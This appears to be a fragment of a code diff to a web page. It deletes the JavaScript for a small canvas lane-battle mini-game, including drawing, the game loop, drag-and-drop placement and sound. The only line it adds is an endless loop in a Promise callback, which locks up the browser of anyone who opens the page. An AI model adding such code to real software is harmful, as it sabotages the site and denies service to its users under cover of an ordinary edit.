+                Promise.resolve().then(() => {
+                    while (true) {
+                        new Promise(resolve => resolve());
+                    }
+                });
             }
-          }
-          towerFire(true); towerFire(false);
-
-          // update projectiles
-          for (const s of state.shots) { s.x += s.vx; s.y += s.vy; }
-          // collide projectiles with nearest enemy in same lane vicinity
-          for (const s of state.shots) {
-            let hit=null, hd=6;
-            for (const e of state.ents) {
-              if (Math.abs(e.y - s.y) < 3 && Math.abs(e.x - s.x) <= hd) { hit = e; break; }
-            }
-            if (hit) { hit.hp -= s.dmg; s.x = -9999; particles(hit.x, hit.y, hit.color); sfx(220, 0.03); }
-          }
-          state.shots = state.shots.filter(s => s.x > -100 && s.x < 440);
-
-          // update hp bars
-          hpYouEl.style.width = `${state.youHP}%`;
-          hpEnemyEl.style.width = `${state.enemyHP}%`;
         }
-
-        // particles
-        const parts = [];
-        function particles(x,y,color){
-          for (let i=0;i<6;i++) parts.push({x,y,vx:(Math.random()-0.5)*1.2,vy:(Math.random()-0.5)*1.2,life:400,color});
-        }
-
-        function draw() {
-          // background
-          ctx.clearRect(0,0,340,220);
-          // lanes
-          ctx.strokeStyle = 'rgba(255,255,255,.08)';
-          ctx.beginPath();
-          ctx.moveTo(0, 120); ctx.lineTo(340,120); ctx.stroke();
-          // bridges
-          ctx.fillStyle = 'rgba(255,255,255,.10)';
-          ctx.fillRect(120, 116, 20, 8);
-          ctx.fillRect(200, 116, 20, 8);
-          // towers
-          function tower(x, y, color){
-            ctx.fillStyle = color;
-            ctx.fillRect(x-6, y-20, 12, 40);
-            ctx.fillRect(x-10, y-24, 20, 6);
-          }
-          tower(40, 120, '#7bf');
-          tower(300, 120, '#f77');
-
-          // units
-          for (const e of state.ents) {
-            ctx.fillStyle = e.color;
-            ctx.beginPath();
-            ctx.arc(e.x, e.y, e.type==='knight'?5:4, 0, Math.PI*2);
-            ctx.fill();
-          }
-          // projectiles
-          for (const s of state.shots) {
-            ctx.fillStyle = s.color;
-            ctx.fillRect(s.x-1, s.y-1, 2, 2);
-          }
-
-          // particles
-          const now = performance.now();
-          for (const p of parts) {
-            const a = Math.max(0, 1 - (400 - p.life)/400);
-            ctx.fillStyle = p.color;
-            ctx.globalAlpha = a*0.8;
-            ctx.fillRect(p.x, p.y, 1.5, 1.5);
-            ctx.globalAlpha = 1;
-            p.x += p.vx; p.y += p.vy; p.life -= 16;
-          }
-          for (let i=parts.length-1;i>=0;i--) if (parts[i].life<=0) parts.splice(i,1);
-
-          // score text
-          ctx.fillStyle = 'rgba(255,255,255,.6)';
-          ctx.font = '10px system-ui, -apple-system, sans-serif';
-          ctx.fillText(`Units: ${state.ents.length}`, 8, 12);
-        }
-
-        let last = performance.now();
-        function loop(t){
-          if (!running) return;
-          const dt = Math.min(50, t - last); last = t;
-          step(dt, t);
-          botAI(t);
-          draw();
-          if (state.youHP <= 0 || state.enemyHP <= 0) {
-            // simple end: reset after brief pause
-            setTimeout(resetGame, 1000);
-            running = false;
-            rafId = null; return;
-          }
-          rafId = requestAnimationFrame(loop);
-        }
-
-        function start(){
-          if (running) return;
-          running = true; last = performance.now();
-          rafId = requestAnimationFrame(loop);
-        }
-        function stop(){
-          running = false;
-          if (rafId) cancelAnimationFrame(rafId); rafId = null;
-        }
-        function resetGame(){
-          state.youHP = 100; state.enemyHP = 100; state.ents = []; state.elixir = 5; updateElixirUI(); draw();
-        }
-
-        // UI events
-        toggleBtn.addEventListener('click', () => {
-          mg.classList.toggle('show');
-          if (mg.classList.contains('show')) start(); else stop();
-        });
-        mgClose.addEventListener('click', () => { mg.classList.remove('show'); stop(); });
-        // Drag-and-drop placement
-        let dragging = null;
-        for (const c of deck) {
-          const el = document.getElementById(c.id);
-          el.addEventListener('dragstart', (e) => {
-            if (el.classList.contains('disabled')) { e.preventDefault(); return; }
-            dragging = c; e.dataTransfer.setData('text/plain', c.type);
-          });
-        }
-        canvas.addEventListener('dragover', (e) => { e.preventDefault(); });
-        canvas.addEventListener('drop', (e) => {
-          e.preventDefault(); if (!dragging) return;
-          const rect = canvas.getBoundingClientRect();
-          const x = (e.clientX - rect.left); const y = (e.clientY - rect.top);
-          // Only allow in player half (left side)
-          if (x > rect.width/2) { dragging=null; return; }
-          const lane = Math.abs(y - lanes[0]) < Math.abs(y - lanes[1]) ? 0 : 1;
-          trySpawnPlayer(dragging.type, lane); dragging = null;
-        });
-
-        // Initialize
-        updateElixirUI();
-        timerEl.textContent = fmtTimer(state.matchMs);
-        draw();
-
-        // Simple SFX
-        let mgAudio = null;
-        function ensureAudio(){ mgAudio = mgAudio || new (window.AudioContext||window.webkitAudioContext)(); }
-        function sfx(freq, dur){ try{ ensureAudio(); const o=mgAudio.createOscillator(); const g=mgAudio.createGain(); o.type='square'; o.frequency.value=freq; g.gain.value=0.05; o.connect(g); g.connect(mgAudio.destination); o.start(); g.gain.exponentialRampToValueAtTime(0.0001, mgAudio.currentTime+dur); o.stop(mgAudio.currentTime+dur); }catch(_){} }
-      })();
     </script>
-  </body>
+</body>
 </html>
